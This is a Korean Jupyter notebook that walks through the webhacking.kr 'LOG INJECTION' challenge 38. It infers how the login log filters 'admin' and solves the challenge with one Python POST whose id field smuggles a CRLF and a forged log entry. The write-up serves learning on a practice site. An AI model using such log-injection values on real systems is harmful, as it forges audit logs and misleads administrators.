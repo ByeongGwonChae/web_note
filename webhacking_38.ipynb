{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 문제"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![38-01](img/38-01.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "주석에 적힌 관리자페이지로 들어가면 로그인 로그를 보여준다. IP도 나와있기에, 캡처하지 않았다."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "값을 입력하고 login 버튼을 다음과 같은 일어난다.\n",
    "\n",
    "1) \"admin\"을 입력할 경우 로그를 남기지 않는다.\n",
    "2) 그 외의 값은 로그에 남는다.\n",
    "3) 주석(#)나 개행문자(\\n)가 그대로 기록되는걸로 봐서는 다음과 같은 순서로 추측된다.\n",
    "4) 입력 → 텍스트로 변경 → admin인지 확인 → 로그 기록\n",
    "5) 목표는 로그에 \"admin\"을 남기는 걸로 생각된다."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 풀이"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "python으로 request요청을 날리고, 크롬 브라우저로 admin.php를 확인하는 작업을 반복하는 식으로 해보자."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<title>Challenge 38</title>\n",
      "</head>\n",
      "<body>\n",
      "<h1>LOG INJECTION</h1>\n",
      "<form method=post action=index.php>\n",
      "<input type=text name=id size=20>\n",
      "<input type=submit value='Login'>\n",
      "</form>\n",
      "<!-- <a href=admin.php>admin page</a> -->\n",
      "</body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "r = requests.post('https://webhacking.kr/challenge/bonus-9/index.php',data={'id':\"admin\\r\\n124.52.70.227:admin\"})\n",
    "print(r.text)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![38-02](img/38-02.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "오 성공했다. "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.7.6 64-bit ('test1': conda)",
   "language": "python",
   "name": "python37664bittest1conda6096207d9ba848ecb47f4c96b52d76b2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
